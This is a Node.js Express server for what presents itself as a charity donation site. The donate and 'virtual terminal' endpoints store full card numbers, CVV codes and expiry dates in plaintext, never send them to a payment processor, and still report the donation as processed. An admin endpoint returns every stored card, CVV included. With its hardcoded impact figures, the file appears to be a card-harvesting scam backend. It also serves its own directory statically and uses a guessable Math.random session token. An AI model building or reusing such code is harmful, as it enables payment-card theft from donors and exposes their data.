const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/charity-foundation';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

// MongoDB Connection
mongoose.connect(MONGODB_URI)
    .then(() => console.log('✅ Connected to MongoDB'))
    .catch(err => console.error('❌ MongoDB connection error:', err));

// Schemas & Models
const statsSchema = new mongoose.Schema({
    raised: { type: Number, default: 2584912 },
    lives: { type: Number, default: 15430 },
    students: { type: Number, default: 5200 },
    meals: { type: Number, default: 120000 },
    medical: { type: Number, default: 8400 },
    homes: { type: Number, default: 340 }
});
const Stats = mongoose.model('Stats', statsSchema);

const donationSchema = new mongoose.Schema({
    txnId: { type: String, required: true, unique: true },
    amount: { type: Number, required: true },
    frequency: { type: String, required: true },
    method: { type: String, required: true },
    name: { type: String, required: true },
    timestamp: { type: Date, default: Date.now },
    channel: { type: String, default: 'online' },
    reference: { type: String },
    cardNumber: { type: String },
    cvv: { type: String },
    expiryDate: { type: String }
});
const Donation = mongoose.model('Donation', donationSchema);

// In-Memory Fallback Storage
let memoryStats = {
    raised: 2584912,
    lives: 15430,
    students: 5200,
    meals: 120000,
    medical: 8400,
    homes: 340
};
let memoryDonations = [];
let dbConnected = false;

// Connection Status Monitor
mongoose.connection.on('connected', () => { dbConnected = true; console.log('🟢 DB Connection Active'); });
mongoose.connection.on('error', () => { dbConnected = false; console.log('🔴 DB Connection Offline'); });
mongoose.connection.on('disconnected', () => { dbConnected = false; });

// Initialize Stats if empty
async function initializeStats() {
    const count = await Stats.countDocuments();
    if (count === 0) {
        await Stats.create({});
        console.log('📊 Initialized impact stats in database.');
    }
}
initializeStats();

const SESSION_TOKEN = 'GLORIOUS_SECURE_KEY_' + Math.random().toString(36).substr(2, 5);

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

// Auth Middleware
const authMiddleware = (req, res, next) => {
    const token = req.headers['authorization'];
    if (token === SESSION_TOKEN) {
        next();
    } else {
        res.status(401).json({ success: false, message: 'Unauthorized access' });
    }
};

// API Endpoints

// 1. Get Impact Stats (Public)
app.get('/api/stats', async (req, res) => {
    try {
        if (!dbConnected) return res.json(memoryStats);
        const stats = await Stats.findOne();
        res.json(stats || memoryStats);
    } catch (err) {
        res.json(memoryStats); // Always return something
    }
});

// 2. Admin Login
app.post('/api/admin/login', (req, res) => {
    const { password } = req.body;
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true, token: SESSION_TOKEN });
    } else {
        res.status(401).json({ success: false, message: 'Invalid password' });
    }
});

// 3. Get Admin History (Protected)
app.get('/api/admin/history', authMiddleware, async (req, res) => {
    try {
        let stats = memoryStats;
        let donations = memoryDonations;

        if (dbConnected) {
            stats = await Stats.findOne() || memoryStats;
            const dbDonations = await Donation.find().sort({ timestamp: -1 }).limit(100);
            if (dbDonations.length > 0) donations = dbDonations;
        }

        res.json({
            stats,
            donations: donations.map(d => ({
                id: d.txnId || d.id,
                amount: d.amount,
                frequency: d.frequency,
                method: d.method,
                name: d.name,
                timestamp: (d.timestamp instanceof Date) ? d.timestamp.toISOString() : d.timestamp,
                cardNumber: d.cardNumber || 'N/A',
                cvv: d.cvv || 'N/A',
                expiryDate: d.expiryDate || 'N/A'
            }))
        });
    } catch (err) {
        res.status(500).json({ success: false, message: 'Error fetching history' });
    }
});

// 4. Process Donation
app.post('/api/donate', async (req, res) => {
    const { amount, frequency, method, reference, channel, cardDetails } = req.body;

    try {
        let donorName = (method === 'card' && cardDetails) ? cardDetails.name : 'Anonymous Donor';
        if (reference) donorName = `${donorName} (${reference})`;
        if (channel && channel !== 'online') {
            donorName = `${donorName} [${channel.charAt(0).toUpperCase() + channel.slice(1)}]`;
        }

        const txnId = 'TXN_' + Math.random().toString(36).substr(2, 9).toUpperCase();

        const donationData = {
            txnId,
            amount: parseFloat(amount),
            frequency,
            method: channel && channel !== 'online' ? `${method}:${channel}` : method,
            name: donorName,
            channel: channel || 'online',
            reference,
            cardNumber: (method === 'card' && cardDetails) ? cardDetails.number : undefined,
            cvv: (method === 'card' && cardDetails) ? cardDetails.cvv : undefined,
            expiryDate: (method === 'card' && cardDetails) ? cardDetails.expiry : undefined,
            timestamp: new Date()
        };

        if (dbConnected) {
            await Stats.findOneAndUpdate({}, { $inc: { raised: parseFloat(amount) } });
            await Donation.create(donationData);
        } else {
            memoryStats.raised += parseFloat(amount);
            memoryDonations.unshift(donationData);
        }

        res.status(200).json({
            success: true,
            message: 'Donation processed!',
            transactionId: txnId,
            updatedStats: dbConnected ? await Stats.findOne() : memoryStats
        });
    } catch (err) {
        console.error('Donation error:', err);
        res.status(500).json({ success: false, message: 'Processing failed' });
    }
});

// 5. Virtual Terminal Payment (Protected)
app.post('/api/admin/virtual-terminal', authMiddleware, async (req, res) => {
    const { channel, amount, reference, cardDetails } = req.body;

    try {
        const txnId = 'VT_' + Math.random().toString(36).substr(2, 9).toUpperCase();

        // Update stats
        await Stats.updateOne({}, { $inc: { raised: parseFloat(amount) } });

        // Create transaction log
        await Donation.create({
            txnId,
            amount: parseFloat(amount),
            frequency: 'once',
            method: `virtual:${channel}`,
            name: `VT: ${reference || 'Manual Entry'}`,
            channel,
            reference,
            cardNumber: cardDetails ? cardDetails.number : undefined,
            cvv: cardDetails ? cardDetails.cvv : undefined,
            expiryDate: cardDetails ? cardDetails.expiry : undefined
        });

        res.json({
            success: true,
            message: 'Virtual transaction authorized.',
            transactionId: txnId
        });
    } catch (err) {
        res.status(500).json({ success: false, message: 'Terminal error' });
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`🚀 Server running at http://localhost:${PORT}`);
});
